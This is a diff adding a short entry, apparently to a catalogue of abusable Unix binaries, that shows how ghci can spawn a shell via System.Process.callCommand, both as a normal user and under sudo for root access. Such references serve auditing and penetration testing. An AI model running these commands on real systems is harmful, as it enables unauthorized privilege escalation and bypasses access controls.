@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
+      }
+    ]
+  }
+}
